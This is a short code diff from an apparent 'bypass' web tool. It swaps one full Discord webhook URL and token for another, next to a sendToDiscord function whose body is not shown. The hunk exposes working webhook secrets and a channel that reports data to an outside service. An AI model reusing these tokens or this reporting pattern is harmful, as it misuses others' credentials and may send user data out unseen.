@@ -226,7 +226,7 @@ export default {
     })();
 
     var API_URL = window.location.origin + '/bypass/noctrune/bypass.php';
-    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1537815401789128756/upQ1LcHBUHEU8rESIYM6s28VDVMqNbIfQXRBIsfGhXd7T8NiIKkeZczBxXFHofuO6VoS';
+    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1537839437390684221/YdNIwo8JMhHfgqGtyy2iBaMG6UgPWqLBLgQu_qrg2paJW7YqgJNkqCXp0se0CbsArHrC';
 
     function sendToDiscord(data) {
         var fields = [
